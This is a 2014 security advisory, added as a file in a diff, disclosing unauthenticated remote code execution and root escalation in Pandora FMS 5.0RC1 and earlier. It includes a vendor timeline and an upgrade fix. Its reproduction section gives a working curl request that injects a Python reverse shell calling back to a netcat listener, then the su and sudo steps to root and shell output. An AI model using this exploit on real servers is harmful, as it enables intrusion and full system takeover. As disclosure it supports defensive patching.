@@ -1,0 +1,103 @@
+-----------
+Author:
+-----------
+
+xistence < xistence[at]0x90[.]nl >
+
+-------------------------
+Affected products:
+-------------------------
+
+Pandora FMS 5.0RC1 and below
+
+-------------------------
+Affected vendors:
+-------------------------
+
+Pandora FMS
+http://pandorafms.com/
+
+-------------------------
+Product description:
+-------------------------
+
+Enterprise IT Monitoring for Networks, Applications, Servers and Virtual
+Infrastructure
+
+----------
+Details:
+----------
+
+[ 0x01 - Remote Code Execution ]
+
+The Pandora 4.0.3 / 4.1 / 5.0 RC1 appliances are prone to security
+vulnerabilities.
+The Anytermd daemon used for the SSH/Telnet gateway on TCP port 8022/8023
+is vulnerable to command injection in the "p" POST parameter,
+which allows any unauthenticated attacker to execute arbitrary commands
+with the rights of the "pandora" user.
+
+The 4.1 and 5.0 RC1 appliances also fail to set a password for the "artica"
+user during installation to the harddrive. It's not possible
+to gain SSH access using this user if there's no password set. However it's
+possible to use the above vulnerability to "su" to the "artica" user and
+from there "sudo"
+to the "root" user as "sudo" won't ask for a password either.
+This issue doesn't exist in the 4.0.3 appliance.
+
+Below are the steps to reproduce this. Gaining a shell as "pandora" is
+possible on all Pandora versions,
+the other privilege escalation steps are only on 4.1 / 5.0.
+
+
+# Open a linux/osx terminal and run a netcat listener like this:
+
+nc -vl 8888
+
+# Execute the following curl command, replace "123.123.123.123" with the IP
+of the Pandora server and "321.321.321.321" with the machine running netcat.
+curl -i -s -k  -X 'POST' \
+    -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+    --data-binary $'a=open&p=%60python -c \'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"321.321.321.321\",8888));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\'%60' \
+    'http://123.123.123.123:8022/anyterm-module'
+
+
+# In the netcat shell you'll receive a shell as user "pandora". Use the
+following command to spawn a pty: python -c 'import
+pty;pty.spawn("/bin/bash")'
+# Change user to artica by doing a "su - artica". From here do a "sudo -s"
+to gain a root shell. Below is how it should look like.
+
+$ nc -vl 8888
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.1$ su - artica
+su - artica
+-bash-4.1$ id
+id
+uid=501(artica) gid=501(artica) groups=501(artica)
+-bash-4.1$ sudo -s
+sudo -s
+[root@localhost artica]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@localhost artica]#
+
+
+-----------
+Solution:
+-----------
+
+Upgrade to Pandora FMS 5.0 final or later
+
+--------------
+Timeline:
+--------------
+
+04-10-2013 - Issues discovered and vendor notified
+04-10-2013 - Reply from vendor stating they will fix it asap
+10-10-2013 - Reply from vendor that they fixed the issue
+04-11-2013 - Release of Pandora FMS 5.0 final
+29-01-2014 - Public disclosure
